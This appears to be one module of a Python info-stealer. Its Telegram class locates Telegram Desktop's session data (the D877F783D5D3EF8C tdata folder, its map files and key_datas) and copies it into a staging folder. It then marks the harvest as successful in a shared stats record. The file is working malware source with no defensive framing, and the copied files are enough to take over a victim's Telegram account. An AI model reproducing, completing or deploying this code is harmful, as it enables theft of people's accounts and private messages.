from re import findall
from shutil import copyfile
from multiprocessing import Process
from os import listdir, path, makedirs

from ..utils.config import TelegramConfig, programs_stats


class Telegram(Process):

    def __init__(self, *args):
        Process.__init__(self)

        self.config = TelegramConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __create_folder(self):

        folder = rf"{self.storage_path}\{self.folder}\D877F783D5D3EF8C"

        if not path.exists(folder):
            makedirs(folder)

    def __get_sessions(self):

        if not path.exists(self.config.SessionsPath):
            return

        folder = rf"{self.storage_path}\{self.folder}"
        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.config.SessionsPath)], [])

        if not sessions:
            return

        self.__create_folder()

        sessions.remove("D877F783D5D3EF8C")

        for session in sessions:
            copyfile(rf"{self.config.SessionsPath}\{session}", rf"{folder}\{session}")

        maps = sum([findall(r"map.*", file) for file in listdir(rf"{self.config.SessionsPath}\D877F783D5D3EF8C")], [])

        for map in maps:
            copyfile(rf"{self.config.SessionsPath}\D877F783D5D3EF8C\{map}", rf"{folder}\D877F783D5D3EF8C\{map}")

        copyfile(rf"{self.config.SessionsPath}\key_datas", rf"{folder}\key_datas")

        programs_stats['Telegram'] = True

    def run(self):

        try:

            if self.statuses[0] is True:
                self.__get_sessions()

        except Exception as e:
            if self.errors is True: print(f"[Telegram]: {repr(e)}")
